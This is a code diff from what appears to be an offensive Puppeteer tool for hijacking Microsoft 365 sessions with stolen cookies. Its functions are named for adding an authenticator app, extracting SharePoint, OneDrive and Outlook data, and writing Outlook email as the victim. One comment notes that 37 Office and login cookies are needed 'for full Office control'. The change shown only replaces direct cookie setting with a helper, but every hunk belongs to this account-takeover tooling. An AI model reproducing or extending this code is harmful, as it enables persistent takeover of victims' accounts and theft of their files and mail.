@@ -19,7 +19,7 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
 
     await db.UpdateTaskStatus(taskId, "running")
 
-    await page.setCookie(...cookies);
+    await necrohelp.SetCookies(page, cookies);
     await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
     await page.goto(params.fixSession);
     //await necrohelp.ScreenshotCurrentPage(page, taskId)
@@ -99,7 +99,7 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
 
     // NOTE: cookies from office365.com as well as .login.microsoftonline.com need to be passed to have full Office control
     /// otherwise we loose the session on app switch. a total of 37 cookies need to be passed!!!
-    await page.setCookie(...cookies);
+    await necrohelp.SetCookies(page, cookies);
     await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
 
     await page.goto(params.fixSession);
@@ -138,7 +138,7 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
 }
 
 exports.SharepointExtrude = async ({ page, data: [taskId, cookies, params] }) => {
-    await page.setCookie(...cookies);
+    await necrohelp.SetCookies(page, cookies);
     await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
 
     await page.goto(params.fixSession);
@@ -221,7 +221,7 @@ exports.SharepointExtrude = async ({ page, data: [taskId, cookies, params] }) =>
 }
 
 exports.OneDriveExtrude = async ({ page, data: [taskId, cookies, params] }) => {
-    await page.setCookie(...cookies);
+    await necrohelp.SetCookies(page, cookies);
     await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
 
     await page.goto(params.fixSession);
@@ -293,7 +293,7 @@ exports.OneDriveExtrude = async ({ page, data: [taskId, cookies, params] }) => {
 }
 
 exports.OutlookWriteEmail = async ({ page, data: [taskId, cookies, params] }) => {
-    await page.setCookie(...cookies);
+    await necrohelp.SetCookies(page, cookies);
     await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
 
     await page.goto(params.fixSession);
@@ -372,7 +372,7 @@ exports.OutlookWriteEmail = async ({ page, data: [taskId, cookies, params] }) =>
 }
 
 exports.OutlookExtrude = async ({ page, data: [taskId, cookies, params] }) => {
-    await page.setCookie(...cookies);
+    await necrohelp.SetCookies(page, cookies);
     await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
     await page.goto(params.fixSession);
 
